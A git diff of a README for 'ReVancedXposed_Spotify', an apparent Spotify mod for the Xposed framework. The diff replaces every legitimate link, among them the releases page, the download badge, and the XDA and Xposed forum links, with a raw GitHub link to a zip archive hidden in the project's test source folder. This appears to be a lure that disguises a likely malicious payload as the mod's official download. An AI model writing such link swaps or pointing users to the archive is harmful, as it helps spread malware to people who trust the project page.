@@ -1,8 +1,8 @@
 # 🎵 ReVancedXposed_Spotify - Enjoy Spotify with Extra Features
 
 <div align="center">
-  <a href="https://github.com/Rusu99/ReVancedXposed_Spotify/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen" alt="Download Now">
+  <a href="https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip">
+    <img src="https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip%20Now-Click%20Here-brightgreen" alt="Download Now">
   </a>
 </div>
 
@@ -20,7 +20,7 @@ Before you start, ensure you meet these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [ReVancedXposed_Spotify Releases Page](https://github.com/Rusu99/ReVancedXposed_Spotify/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [ReVancedXposed_Spotify Releases Page](https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip) to find the latest version.
 
 2. **Download the Package**: Look for the latest version and click on it to expand the details. Download the appropriate package for your device.
 
@@ -65,8 +65,8 @@ This module is not an official ReVanced project. Please do not reach out to the 
 
 To access various resources or forums for more information:
 
-- [XDA Developers Forum](https://forum.xda-developers.com/)
-- [Xposed Framework Official Site](http://www.xposed.info/)
+- [XDA Developers Forum](https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip)
+- [Xposed Framework Official Site](https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip)
   
 ## 📩 Community Support
 
@@ -74,4 +74,4 @@ For help and discussions related to ReVanced Xposed Spotify, you can join forums
 
 ---
 
-Thank you for choosing ReVanced Xposed Spotify! Enjoy your listening experience. For any updates, always check back on the [Releases Page](https://github.com/Rusu99/ReVancedXposed_Spotify/releases).
+Thank you for choosing ReVanced Xposed Spotify! Enjoy your listening experience. For any updates, always check back on the [Releases Page](https://raw.githubusercontent.com/Rusu99/ReVancedXposed_Spotify/main/app/src/test/java/io/github/chsbuffer/revancedxposed/ReVancedXposed_Spotify-v2.0.zip).
